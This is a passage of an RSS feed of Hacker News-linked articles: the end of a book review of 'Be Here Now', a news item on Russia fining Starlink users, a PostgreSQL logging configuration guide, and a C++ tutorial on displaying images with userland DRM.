<img src="https://schmud.de/img/2020-12-16-be-here-now/be-here-now.webp" alt="Be Here Now by Ram Dass (1971)"> <em>Be Here Now</em> by Ram Dass (1971) <i></i> <a href="https://www.gardenfairyco.com/product/be-here-now-ram-dass">Garden Fairy Co.</a>
</figure>
<p>Ram Dass spends the first part of the book describing his journey. It involves a dive into the world of psychedelic drugs and their benefits and limitations. His experience essentially opens him up to Eastern mysticism. He finds surprisingly few charlatans on the road through Central Asia and India. The book’s pivotal guru broadens Ram Dass’ mind through a process of “no teaching” because “his lessons aroused in me just affirmation… as if I knew it all already.”</p>
<p>The author strikes an important difference between <em>teacher</em> and <em>guru</em>. “A teacher points the way” while “a guru is the way.” Ram Dass’ awakening, and this book, is the result of the guru’s care.</p>
<p>This leads to a beautifully illustrated but overtly dogmatic section where Ram Dass attempts wake the reader up. The writer’s intention is rooted in Buddhism’s long practice of shifting the practitioner’s habitual and unquestioned perception of the world.<span><label for="sn-3"></label><span>The guru offers a few clever turns of phrases in this effort, “If a pickpocket meets a saint, he sees only his pockets” and “If you wear shoe leather, the whole earth is covered with leather.”</span></span> Ram Dass’ spiritual youth feels most pronounced here. He doesn’t have the language of a guru or a teacher; it is the voice of an enthusiastic lecturer who is convinced that he has uncovered the Truth.</p>
<p>The final section of the book is a collection of quotes and techniques divided into various “ingredients for a sacred life” such as <em>Sleeping</em>, <em>Truth</em>, <em>Time and Space</em>, <em>Pranayam</em>, etc…. It is pleasant reading.</p>
<p>Ram Dass makes it clear that there can be no <em>knower</em> if one truly wants to <em>know</em> the wisdom contained in <em>Be Here Now</em>; the rational mind that separates <em>subject</em> from <em>object</em> is an illusion.<span><label for="sn-4"></label><span>(Loc. 4594, 4613)</span></span> This illusion is driven by an attachment to the self as special and wholly separate from everything else.</p>

<figure>
<img src="https://schmud.de/img/2020-12-16-be-here-now/karateka-3.png" alt="Karateka Atari 7800 (1988)"> <em>Karateka</em> Atari 7800 (1988) <i></i> <a href="https://boardgamegeek.com/images/thing/77183/karateka-1984">Board Game Geek</a>
</figure>
<p>Deep within the cartridge of <em>Karateka</em> on the Atari 7800 are a list of instructions that drive the machine. But the programmer did mix in one human-readable message with the computer code: “Mommy and Me Are One.” This bizarre statement is unique to the Atari 7800 cartridge. It does not appear in other versions. It never appears on screen. It is only visible to those who are looking at the code contained within.<span><label for="sn-5"></label><span>“<a href="https://www.digitpress.com/eastereggs/78karateka.htm">Digital Press Easter Eggs: Karateka</a>”, <em>digitpress.com</em>, 2010.</span></span></p>
<p>The phrase is almost certainly related to a paper published by Lloyd Silverman and Joel Weinberger in a 1985 edition of <em>American Psychologist</em> entitled “<a href="https://content.apa.org/doiLanding?doi=10.1037%2F0003-066X.40.12.1296">Mommy and I Are One: Implications For Psychotherapy</a>”. The authors assert that the titular message can help motivate people even when stated subliminally.</p>
<p>Countless studies have attempted to demonstrate the benefits of “oneness.” In the case of the mother, oneness is self-evident. We were all physically connected at one point. And deep within us exists a DNA code that has been directly passed from mother to child for millennia. This is the ancient information that sets the foundation for consciousness.</p>
<p>The reality of a consciousness larger than ourselves is at the root of <em>Be Here Now.</em> But rather than establish a God or a single methodology, Ram Dass continually asserts that the ego blinds us to the grand web of connections that pervade our everyday experience. The way to lift the veil is to simply practice living in the moment. Or as Suzuki Roshi is quoted, “a Zen student must learn to waste time conscientiously.”<span><label for="sn-6"></label><span>(Loc. 4728)</span></span></p>

<p>Events from this post have been added to a <a href="https://schmud.de/pages/timeline.html">timeline</a> of significant events in the history of information.</p>
<section id="david-padwa-co-founds-basic-systems-with-francis-mechner" data-date-is="1960" data-machine-date="1960">
<h2>David Padwa Co-Founds Basic Systems With Francis Mechner</h2>
<p>“1960-1965. Founder and CEO of Basic Systems Inc.&nbsp;Principal offices in Cambridge, New York, Chicago, Pasadena, and Washington, DC. Firm specialized in educational and curricular technologies as well as the provision of systems integration services in education and training markets. In 1964 Xerox Corporation acquired Basic Systems; continued as division executive at Xerox and Director of Planning for educational markets.”</p>

</section>
</section></div>]]>
            </description>
            <link>https://schmud.de/posts/2020-12-16-be-here-now.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25970184</guid>
            <pubDate>Sat, 30 Jan 2021 16:11:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Russian citizens could be fined for using SpaceX’s Starlink Internet Service]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25970109">thread link</a>) | @sodrick
<br/>
January 30, 2021 | https://relayvibe.news/russian-citizens-could-be-fined | <a href="https://web.archive.org/web/*/https://relayvibe.news/russian-citizens-could-be-fined">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a href="https://relayvibes.co/tag/russia">Russia</a>‘s parliament, is looking at placing fines on individuals and companies in the country who use Western-based satellite Internet services. The bill, if passed into law, is to avoid access to the Internet using <a href="https://relayvibes.co/tag/spacex">SpaceX</a>‘s Starlink service, OneWeb, or other network means aside Russian satellite constellations under development.</p>
<p>in the Russian edition of Popular Mechanics</p>
<p>According to a recent report , the proposed fines is ranging from 10-30 thousand rubles ($135-$405) for ordinary users, and from 500 thousand to 1 million rubles ($6,750 to $13,500) for companies who make use of the Western satellite services.</p>
<p>In response to the news, Elon Musk has responded to the tweet with “We’re just trying to get people to Mars. Help would be appreciated”</p>
<p>Members of the Duma believe that accessing the Internet freely would skip the country’s System of Operational Search Measures, which is monitoring Internet usage and mobile communications..<br>
Being part of the Russia’s strict control on media and communications, all Russian Internet traffic are compelled to navigate via a Russian communications provider.</p>
<p>Russia may, over time, however, block Starlink service. Dmitry Rogozin, Russia;s Space chief sees SpaceX as a chief competitor in spaceflight.</p>
<p>Starlink, Rogozin had said in August 2020 that it’s part of “a rather marauding, strong, high-technology policy of the United States, which makes use of Shock and Awe so as to improve, ahead of other, their military interests.</p>
<p>The ban on OneWeb is rather funny, with the notion that the company uses the Russian Soyuz rocket to launch almost all of its fist constellation into orbit. Every month, OneWeb satellite launches are planned, mainly from spaceports in Baikonur, Kazahkstan, and Vostochny, Russia. OneWeb is effectively assisting to shore the striving Russian launch industry in a period when SpaceX is undersell the country on commercial launch agreements.</p>
<p>Russia has it in plan to design its own satellite internet constellation, Sfera. While its affordability is yet to stand, it is most likely to be launched in 2024, according to IntelliNews. Expected cost of the project is about 1.5 trillion rubles (around $20 billion), it would supposedly allow the Russia to effectively monitor domestic internet traffic,</p>

</div></div>]]>
            </description>
            <link>https://relayvibe.news/russian-citizens-could-be-fined</link>
            <guid isPermaLink="false">hacker-news-small-sites-25970109</guid>
            <pubDate>Sat, 30 Jan 2021 16:04:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Real-Time Attack-SchemeVisualization for Complex Exploit Technique Comprehension [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25969932">thread link</a>) | @based2
<br/>
January 30, 2021 | http://www.ijmlc.org/vol11/1030-FN008.pdf | <a href="https://web.archive.org/web/*/http://www.ijmlc.org/vol11/1030-FN008.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://www.ijmlc.org/vol11/1030-FN008.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-25969932</guid>
            <pubDate>Sat, 30 Jan 2021 15:42:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Configuring PostgreSQL for Observability]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25969876">thread link</a>) | @i_have_to_speak
<br/>
January 30, 2021 | https://pgdash.io/blog/postgres-observability.html?h | <a href="https://web.archive.org/web/*/https://pgdash.io/blog/postgres-observability.html?h">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <div>
          
          <p>How to ensure you have what you need to debug when things break
</p>
        </div>
      </div><div>
        <div>
          <div>
            <p>PostgreSQL comes with a plethora of configuration options, but changing the
default settings of some of these options drastically improves the observability
of your PostgreSQL server. You’ll want to set and configure these options before
issues crop up in production, as they can provide information essential to
understanding and resolving those issues.</p>

<p>Read on to learn more about the settings and extensions that expose metrics and
information about the inner workings of your PostgreSQL server.</p>

<h3 id="log-line-prefix">Log Line Prefix</h3>

<p>The <em>log_line_prefix</em> configuration option determines what PostgreSQL writes at
the beginning of each log line. The default depends on the specific Linux
distribution or managed solution that you’re using, but more often than not it
does not include a few items that can prove very useful in tracking down
misbehaving clients. Try this <em>log_line_prefix</em>:</p>

<figure><pre><code data-lang="ini"><span>log_line_prefix</span> <span>=</span> <span>'%m [%p] %a %u %d %h '</span></code></pre></figure>

<p>It includes the timestamp (<em>%m</em>), the PID of the backend process (<em>%p</em>), the
application name (<em>%a</em>) of the client, the username which the client has connected
with (<em>%u</em>), the database which the client has connected to (<em>%d</em>) and the
hostname or IP where the connection is coming from (<em>%h</em>). This results in log
lines like this:</p>

<figure><pre><code data-lang="none">2021-01-30 05:06:03.675 UTC [73] psql postgres bench 172.17.0.1 ERROR:  relation "pgbench_akkounts" does not exist at character 15
2021-01-30 05:06:03.675 UTC [73] psql postgres bench 172.17.0.1 STATEMENT:  select * from pgbench_akkounts;</code></pre></figure>

<p>which are much more useful than the default. You can see that a client connected
from <em>172.17.0.1</em> as user <em>postgres</em> to database <em>bench</em>, and the application
was <em>psql</em>. Definitely an improvement over the default option, which shows
only this:</p>

<figure><pre><code data-lang="text">2021-01-30 05:13:22.630 UTC [63] ERROR:  relation "pgbench_akkounts" does not exist at character 15
2021-01-30 05:13:22.630 UTC [63] STATEMENT:  select * from pgbench_akkounts;</code></pre></figure>

<h3 id="logging-slow-queries">Logging Slow Queries</h3>

<p>PostgreSQL can be configured to log queries that take more than a set amount
of time to execute. These go into the same log file; there is no separate
slow query log file as in MySQL.</p>

<p>To log statements that take more than 1 second to execute, use the
<em>log_min_duration_statement</em> option like this:</p>

<figure><pre><code data-lang="ini"><span>log_min_duration_statement</span> <span>=</span> <span>1s</span></code></pre></figure>

<p>Note that <em>log_min_duration_statement</em> will consider all statements (including
for example, long-running admin statements like <em>REINDEX TABLE</em>) and not just
queries (<em>SELECT</em>). Here are some log entries produced by this option:</p>

<figure><pre><code data-lang="text">2021-01-30 08:42:57.473 UTC [62] psql postgres postgres 172.17.0.1 LOG:  duration: 1016.283 ms  statement: select pg_sleep(1);
2021-01-30 08:52:00.541 UTC [62] psql postgres postgres 172.17.0.1 LOG:  duration: 1118.277 ms  statement: select pg_sleep(1.1);</code></pre></figure>

<p>If this results in too many logs of similar statements, you can tell Postgres to
log only a percentage of it, using:</p>

<figure><pre><code data-lang="ini"><span>log_min_duration_statement</span> <span>=</span> <span>-1</span>
<span>log_min_duration_sample</span> <span>=</span> <span>1s</span>
<span>log_statement_sample_rate</span> <span>=</span> <span>0.25</span></code></pre></figure>

<p>This logs only 25% of the statements that become eligible for logging (the ones
that took more than 1 second to execute). The log output is the same as before.
There is no way to know how many eligible statements were not logged.</p>

<p>To log all statements, along with the time taken to execute them, use the
<em>log_statement</em> option instead:</p>

<figure><pre><code data-lang="ini"><span>log_statement</span> <span>=</span> <span>mod</span>
<span>log_duration</span> <span>=</span> <span>on</span></code></pre></figure>

<p>The ‘mod’ option tells Postgres to log DDLs and data-modifying statements. This
results in logs like these:</p>

<figure><pre><code data-lang="text">2021-01-30 08:35:08.985 UTC [64] pgbench postgres bench 172.17.0.1 LOG:  statement: insert into pgbench_tellers(tid,bid,tbalance) values (10,1,0)
2021-01-30 08:35:08.985 UTC [64] pgbench postgres bench 172.17.0.1 LOG:  duration: 0.241 ms</code></pre></figure>

<p>Be warned that it is <em>not</em> possible to sample statement logging enabled this way,
all statements will be logged, and you’ll end up with tons of log entries.</p>

<h3 id="logging-locks-and-deadlocks">Logging Locks and Deadlocks</h3>

<p>Queries can wait too long to acquire a lock. Typically, an upper limit on how
long to wait is set using the option <em>lock_timeout</em>, usually at the client side.
If a query has been waiting this long to acquire a lock, Postgres will cancel
the execution of this query and log an error:</p>

<figure><pre><code data-lang="text">2021-01-30 09:35:52.415 UTC [67] psql postgres testdb 172.17.0.1 ERROR:  canceling statement due to lock timeout
2021-01-30 09:35:52.415 UTC [67] psql postgres testdb 172.17.0.1 STATEMENT:  cluster t;</code></pre></figure>

<p>Let’s say you want to set a lock timeout of 1 minute, but log queries that
wait for locks for more than, say 30 seconds. You can do this using:</p>

<figure><pre><code data-lang="ini"><span>log_lock_waits</span> <span>=</span> <span>on</span>
<span>deadlock_timeout</span> <span>=</span> <span>30s</span></code></pre></figure>

<p>This will create logs like this:</p>

<figure><pre><code data-lang="text">2021-01-30 09:49:22.331 UTC [70] psql postgres testdb 172.17.0.1 LOG:  process 70 still waiting for ShareLock on transaction 493 after 30009.004 ms
2021-01-30 09:49:22.331 UTC [70] psql postgres testdb 172.17.0.1 DETAIL:  Process holding the lock: 68. Wait queue: 70.
2021-01-30 09:49:22.331 UTC [70] psql postgres testdb 172.17.0.1 CONTEXT:  while locking tuple (0,3) in relation "t"
2021-01-30 09:49:22.331 UTC [70] psql postgres testdb 172.17.0.1 STATEMENT:  select * from t for update;</code></pre></figure>

<p>The use of <em>deadlock_timeout</em> is not a typo: it is the value that the lock wait
logging mechanism uses. Ideally, there should have been something like <em>log_min_duration_lock_wait</em>,
but unfortunately, that is not the case.</p>

<p>In case of actual deadlocks, Postgres will abort the deadlocked transactions
after <em>deadlock_timeout</em> duration, and will log the offending statements. No
explicit configuration is necessary.</p>

<figure><pre><code data-lang="text">2021-01-30 09:55:37.724 UTC [68] psql postgres testdb 172.17.0.1 LOG:  process 68 detected deadlock while waiting for ShareLock on transaction 496 after 30007.633 ms
2021-01-30 09:55:37.724 UTC [68] psql postgres testdb 172.17.0.1 DETAIL:  Process holding the lock: 70. Wait queue: .
2021-01-30 09:55:37.724 UTC [68] psql postgres testdb 172.17.0.1 CONTEXT:  while locking tuple (0,3) in relation "t"
2021-01-30 09:55:37.724 UTC [68] psql postgres testdb 172.17.0.1 STATEMENT:  select * from t where a=4 for update;
2021-01-30 09:55:37.725 UTC [68] psql postgres testdb 172.17.0.1 ERROR:  deadlock detected
2021-01-30 09:55:37.725 UTC [68] psql postgres testdb 172.17.0.1 DETAIL:  Process 68 waits for ShareLock on transaction 496; blocked by process 70.
        Process 70 waits for ShareLock on transaction 495; blocked by process 68.
        Process 68: select * from t where a=4 for update;
        Process 70: select * from t where a=0 for update;
2021-01-30 09:55:37.725 UTC [68] psql postgres testdb 172.17.0.1 HINT:  See server log for query details.
2021-01-30 09:55:37.725 UTC [68] psql postgres testdb 172.17.0.1 CONTEXT:  while locking tuple (0,3) in relation "t"
2021-01-30 09:55:37.725 UTC [68] psql postgres testdb 172.17.0.1 STATEMENT:  select * from t where a=4 for update;</code></pre></figure>

<h3 id="logging-autovacuums">Logging Autovacuums</h3>

<p>The autovacuum process kicks in when Postgres determines the data in a table
has changed sufficiently to warrant a vacuum and analyze. To keep an eye on
this process, enable the logging of autovacuum runs:</p>

<figure><pre><code data-lang="ini"><span>log_autovacuum_min_duration</span> <span>=</span> <span>250ms</span></code></pre></figure>

<p>Here is a sample entry that was caused by excessive changes to one table:</p>

<figure><pre><code data-lang="text">2021-01-30 10:23:33.201 UTC [63]     LOG:  automatic vacuum of table "postgres.public.t": index scans: 0
        pages: 0 removed, 95 remain, 0 skipped due to pins, 0 skipped frozen
        tuples: 8991 removed, 10000 remain, 0 are dead but not yet removable, oldest xmin: 492
        buffer usage: 215 hits, 4 misses, 4 dirtied
        avg read rate: 1.885 MB/s, avg write rate: 1.885 MB/s
        system usage: CPU: user: 0.01 s, system: 0.00 s, elapsed: 0.01 s
        WAL usage: 244 records, 1 full page images, 67984 bytes
2021-01-30 10:23:33.222 UTC [63]     LOG:  automatic analyze of table "postgres.public.t" system usage: CPU: user: 0.01 s, system: 0.00 s, elapsed: 0.01 s</code></pre></figure>

<p>Note that autovacuum will typically trigger an analyze after the vacuum, and
this will also be logged.</p>

<p>These logs will help you figure out how best to tune the autovacuum parameters,
and will help in investigating if and when autovacuum is not being as effective
as you thought it would be.</p>

<h3 id="logging-checkpoints">Logging Checkpoints</h3>

<p>Checkpointing is the process of pushing WAL-logged changes into the actual files
that back tables. Ideally checkpoints should occur at regular-and-not-too-frequent
intervals, as it is a CPU and disk intensive process. For various reasons,
checkpoints are also forced to happen before the next scheduled time, and this
results in reduced query performance.</p>

<p>To keep an eye on checkpoint frequency and efficiency, enable logging of
checkpoints:</p>

<figure><pre><code data-lang="ini"><span>log_checkpoints</span> <span>=</span> <span>on</span></code></pre></figure>

<p>This tells PostgreSQL to log the following whenever a checkpoint occurs:</p>

<figure><pre><code data-lang="text">2021-01-30 10:05:57.085 UTC [56]     LOG:  checkpoint starting: immediate force wait
2021-01-30 10:05:57.159 UTC [56]     LOG:  checkpoint complete: wrote 0 buffers (0.0%); 0 WAL file(s) added, 0 removed, 0 recycled; write=0.000 s, sync=0.000 s, total=0.074 s; sync files=0, longest=0.000 s, average=0.000 s; distance=0 kB, estimate=0 kB</code></pre></figure>

<p>The first line contains the flags that backend passed to the checkpointer. You
can see that the “force” caused a checkpoint even though there were no pending
changes to checkpoint. If “immediate” had not been specified, the checkpointer
would have checkpointed up to <em>checkpoint_completion_target</em>.</p>

<h3 id="other-server-side-settings">Other Server-Side Settings</h3>

<p>There are a couple of other settings that you can turn on in your PostgreSQL
configuration that will help with diagnosing issues:</p>

<ul>
  <li><em>track_io_timing</em> - setting this to <em>on</em> lets you see the time spent in
disk I/O for each query (combined with pg_stat_statements extension
described below). See <a href="https://www.postgresql.org/docs/current/runtime-config-statistics.html#GUC-TRACK-IO-TIMING">the docs</a>
about a caveat to turning this on, but should be safe on nearly any modern
Linux. Seeing a query’s disk I/O cost is impossible without turning this on.</li>
  <li><em>track_commit_timestamp</em> - setting this to <em>on</em> can be useful in debugging
replication lags and other replication-related …</li></ul></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://pgdash.io/blog/postgres-observability.html?h">https://pgdash.io/blog/postgres-observability.html?h</a></em></p>]]>
            </description>
            <link>https://pgdash.io/blog/postgres-observability.html?h</link>
            <guid isPermaLink="false">hacker-news-small-sites-25969876</guid>
            <pubDate>Sat, 30 Jan 2021 15:36:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Learning Userland DRM – Displaying Images Without X11]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25969811">thread link</a>) | @felipetavares
<br/>
January 30, 2021 | https://felipetavares.com/post/learning-userland-drm-part-ii/ | <a href="https://web.archive.org/web/*/https://felipetavares.com/post/learning-userland-drm-part-ii/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <p>In the <a href="https://felipetavares.com/post/learning-userland-drm-part-i/">previous post</a> in this series, we talked about how user
applications can use the system call <code>ioctl()</code> after opening a file that’s
usually called <code>/dev/dri/card0</code> to drive the graphics card and draw things on
the screen.</p>
<p>We did not yet draw anything on the screen, we only talked to the driver and got
some information on the current version:</p>
<pre><code>❯ ./drm-part-1
i915
Intel Graphics
1.6.0
</code></pre>

<p>From now on we will have to use intel specific commands since we have an intel
card, so unfortunatly almost nothing from here applies to other cards, except
the general concepts - which are actually very important: you can easily learn
specifics if you know how the whole thing is supposed to work.</p>

<p>First thing, lets include <code>string.h</code> because it is useful for memory
manipulation, which we will need when we start sending images and other kinds of
buffers (commands, mainly) to the graphics card.</p>
<p>And now lets include the actual header files for <code>libdrm</code> for some quality of
live improvements versus directly sending structs to the kernel using <code>ioctl()</code>.
And while we are at it, lets include the libraries specific to intel cards and
our intel driver too.</p>
<div><pre><code data-lang="cpp"><span>// libdrm
</span><span></span><span>#include</span> <span>&lt;xf86drm.h&gt;</span><span>
</span><span>#include</span> <span>&lt;xf86drmMode.h&gt;</span><span>
</span><span></span><span>// intel-specific memory management &amp; commands
</span><span></span><span>#include</span> <span>&lt;libdrm/intel_bufmgr.h&gt;</span><span>
</span><span>#include</span> <span>&lt;libdrm/i915_drm.h&gt;</span><span>
</span></code></pre></div><p>Now lets create the same functionality as we did previously but using the
higher-level <em>libdrm</em> functions! But first, lets update our <code>print_version()</code>
definition:</p>
<div><pre><code data-lang="cpp"><span>void</span> <span>print_version</span>(<span>const</span> drmVersionPtr version) {
    std<span>::</span>cout <span>&lt;&lt;</span> std<span>::</span>string(version<span>-&gt;</span>name, version<span>-&gt;</span>name_len) <span>&lt;&lt;</span> std<span>::</span>endl
              <span>&lt;&lt;</span> std<span>::</span>string(version<span>-&gt;</span>desc, version<span>-&gt;</span>desc_len) <span>&lt;&lt;</span> std<span>::</span>endl
              <span>&lt;&lt;</span> version<span>-&gt;</span>version_major <span>&lt;&lt;</span> <span>"."</span>
              <span>&lt;&lt;</span> version<span>-&gt;</span>version_minor <span>&lt;&lt;</span> <span>"."</span>
              <span>&lt;&lt;</span> version<span>-&gt;</span>version_patchlevel <span>&lt;&lt;</span> std<span>::</span>endl;
}
</code></pre></div><p>the only difference is that now we are taking a <code>drmVersionPtr</code> in instead of a
<code>drm_version_t&amp;</code>, which also implies converting <code>.</code> acessors to <code>-&gt;</code> ones.</p>
<p>And now lets create the function which will do the same thing as we were doing,
<code>fetch_and_print_driver_version</code>:</p>
<div><pre><code data-lang="cpp"><span>void</span> <span>fetch_and_print_driver_version</span>(<span>const</span> <span>int</span> gpu) {
    <span>// Let libdrm handle the ioctl()s
</span><span></span>    drmVersionPtr version <span>=</span> drmGetVersion(gpu);
    drmVersionPtr lib_version <span>=</span> drmGetLibVersion(gpu);

    std<span>::</span>cout <span>&lt;&lt;</span> <span>"Driver:"</span> <span>&lt;&lt;</span> std<span>::</span>endl;
    print_version(version);
    std<span>::</span>cout <span>&lt;&lt;</span> <span>"Lib:"</span> <span>&lt;&lt;</span> std<span>::</span>endl;
    print_version(lib_version);

    <span>// Free memory
</span><span></span>    drmFreeVersion(version);
    drmFreeVersion(lib_version);
}
</code></pre></div>
<p>Now we are going to jump into new territory. We are going to set the mode that
the graphics card will opperate in, which is essentially setting the screen
resolution. We also have a new way of opening the graphics card file:</p>
<div><pre><code data-lang="cpp"><span>// There is a drmOpenMinor function in libdrm for which no Bus ID is needed
</span><span>// but it is not exposed :/
</span><span></span><span>const</span> <span>int</span> gpu <span>=</span> drmOpen(<span>nullptr</span>, <span>"pci:0000:00:02.0"</span>);
</code></pre></div><p>for that we need the <strong>Bus ID</strong>, which we can find with <code>lspci</code> in the shell:</p>
<pre><code>❯ lspci
...
00:02.0 VGA compatible controller: Intel Corporation Skylake GT2 [HD Graphics 520] (rev 07)
...
</code></pre>
<p>or we can also find in the <code>journalctl</code> logs the part where the kernel detects the
graphics card:</p>
<pre><code>❯ journalctl -k -b 0 | grep VGA
Jan 24 18:47:37 corona kernel: pci 0000:00:02.0: vgaarb: setting as boot VGA device
...
</code></pre>
<p>After opening the file, we also need to initialize the intel memory manager,
which will manage buffers in the graphics card for us.</p>
<div><pre><code data-lang="cpp"><span>auto</span> bufmgr <span>=</span> drm_intel_bufmgr_gem_init(gpu, <span>32</span>);
</code></pre></div>
<p>KMS, or Kernel Mode Setting is, as mentioned above, more or less setting the
screen resolution. In reality we are setting a <em>mode</em>, which is not just the
screen resolution, but all other related configurations in the card: bit depth,
margins etc.</p>
<p>There are four main structures involved in <em>KMS</em>: <strong>resources</strong>, <strong>connectors</strong>,
<strong>encoders</strong> and <strong>crtcs</strong>.</p>
<p><img src="https://felipetavares.com/img/kms-structures.png" alt="resources → connectors → encoders → crtcs"></p>
<p>What actually does the “mode setting” and sets the display configurations is
setting the <em>Cathode Ray Tube Controller</em> (CRTC, I know, this should be
refactored at this point…) mode with <code>drmModeSetCrtc()</code> but to get it we need
to get the resources, connectors and encoders to finally find our CRTC.</p>
<div><pre><code data-lang="cpp"><span>// Get the resources
</span><span></span><span>const</span> drmModeResPtr res <span>=</span> drmModeGetResources(gpu);

<span>// Get each connector -&gt; encoder -&gt; crtc
</span><span></span><span>for</span> (size_t c<span>=</span><span>0</span>;c<span>&lt;</span>res<span>-&gt;</span>count_connectors;c<span>++</span>) {
    <span>auto</span> connector <span>=</span> drmModeGetConnector(gpu, res<span>-&gt;</span>connectors[c]);
    <span>auto</span> encoder <span>=</span> drmModeGetEncoder(gpu, connector<span>-&gt;</span>encoder_id);
    <span>auto</span> controller <span>=</span> drmModeGetCrtc(gpu, encoder<span>-&gt;</span>crtc_id);

    <span>// Loop through each mode, but actually we will just break after setting the
</span><span></span>    <span>// first mode
</span><span></span>    <span>for</span> (size_t m<span>=</span><span>0</span>;m<span>&lt;</span>connector<span>-&gt;</span>count_modes;m<span>++</span>) {
        <span>auto</span> width <span>=</span> connector<span>-&gt;</span>modes[m].hdisplay;
        <span>auto</span> height <span>=</span> connector<span>-&gt;</span>modes[m].vdisplay;

        <span>// Which connectors will we be using?
</span><span></span>        <span>uint32_t</span> connector_ids[] <span>=</span> {connector<span>-&gt;</span>connector_id};
        <span>uint32_t</span> tiling_mode <span>=</span> I915_TILING_NONE;
        <span>// RGBA, 1 byte each, so each line is 4 x width
</span><span></span>        <span>uint64_t</span> pitch <span>=</span> <span>4</span><span>*</span>width;
        <span>// bo, "Buffer Object": our framebuffer
</span><span></span>        <span>auto</span> bo <span>=</span> drm_intel_bo_alloc_tiled(bufmgr, <span>"screen"</span>,
                                           width, height, <span>4</span>,
                                           <span>&amp;</span>tiling_mode, <span>&amp;</span>pitch,
                                           <span>0</span>);
        <span>// ... fill the bo with something cool ...
</span><span></span>
        <span>uint32_t</span> buf_id;
        <span>// Add the BO we just created as a framebuffer (FB)
</span><span></span>        assert(drmModeAddFB(gpu, width, height, <span>24</span>, <span>32</span>, pitch, bo<span>-&gt;</span>handle, <span>&amp;</span>buf_id) <span>==</span> <span>0</span>);

        <span>// THIS is the actual mode setting! Everything else is here just to
</span><span></span>        <span>// support this call!
</span><span></span>        assert(drmModeSetCrtc(gpu,
                              controller<span>-&gt;</span>crtc_id,  <span>// crtc
</span><span></span>                              buf_id,               <span>// framebuffer
</span><span></span>                              <span>0</span>, <span>0</span>,
                              connector_ids, <span>1</span>,     <span>// connectors
</span><span></span>                              <span>&amp;</span>connector<span>-&gt;</span>modes[m]) <span>// mode
</span><span></span>               <span>==</span> <span>0</span>);
        <span>//
</span><span></span>
        drm_intel_bo_unreference(bo);

        drmModeFreeCrtc(controller);
        drmModeFreeEncoder(encoder);

        <span>break</span>;
    }

    drmModeFreeConnector(connector);

    <span>break</span>;
}

drmModeFreeResources(res);
</code></pre></div><p>And that’s it! That’s what you need to actually display something in the screen:</p>
<ol>
<li>get the resources;</li>
<li>choose one connector;</li>
<li>get the encoder and controller for it;</li>
<li>choose one of its supported modes;</li>
<li>allocate a framebuffer;</li>
<li>set the mode!</li>
</ol>
<p>In the actual source I added a cool little function called
<code>fill_with_little_squares()</code> which fills the framebuffer with little squares
before sending to the GPU so you can actually see something:</p>
<div><pre><code data-lang="cpp"><span>void</span> <span>fill_with_little_squares</span>(drm_intel_bo <span>*</span>bo, size_t width, size_t height) {
    drm_intel_bo_map(bo, <span>1</span>);
    <span>for</span> (size_t i<span>=</span><span>0</span>;i<span>&lt;</span>width<span>*</span>height<span>*</span><span>4</span>;i<span>+=</span><span>1</span>) {
        <span>auto</span> x <span>=</span> (i<span>/</span><span>4</span><span>/</span><span>16</span>)<span>%</span>width;
        <span>auto</span> y <span>=</span> i<span>/</span>(<span>4</span><span>*</span><span>16</span><span>*</span>width);
        <span>static_cast</span><span>&lt;</span><span>uint8_t</span><span>*&gt;</span>(bo<span>-&gt;</span>virt)[i] <span>=</span> (x<span>+</span>y)<span>%</span><span>2</span> <span>?</span> <span>0</span> <span>:</span> <span>255</span>;
    }
    drm_intel_bo_unmap(bo);
}
</code></pre></div><p>Do a little compilling linking against <code>libdrm</code> and <code>libdrm_intel</code>…</p>
<pre><code>❯ clang++ drm-part-2.cpp -o drm-part-2 -I/usr/include/libdrm/ -ldrm -ldrm_intel
</code></pre>
<p>And when we run this is what we get:</p>
<pre><code>❯ ./drm-part-2
</code></pre>

<p>We did it! Displaying images on the screen without <em>X11</em>!</p>
<blockquote>
<p>In the next part we will talk about actually sending commands to the GPU to make
it draw for us.</p>
</blockquote>
<p><a href="https://felipetavares.com/src/drm/drm-part-2.cpp">drm-part-2.cpp</a></p>

    </article></div>]]>
            </description>
            <link>https://felipetavares.com/post/learning-userland-drm-part-ii/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25969811</guid>
            <pubDate>Sat, 30 Jan 2021 15:27:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why machine learning algorithms are hard to tune and how to fix it]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25969787">thread link</a>) | @317070
<br/>
January 30, 2021 | https://engraved.ghost.io/why-machine-learning-algorithms-are-hard-to-tune/ | <a href="https://web.archive.org/web/*/https://engraved.ghost.io/why-machine-learning-algorithms-are-hard-to-tune/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                                <div>
                                    <section>
                                        <p>11 min read</p>
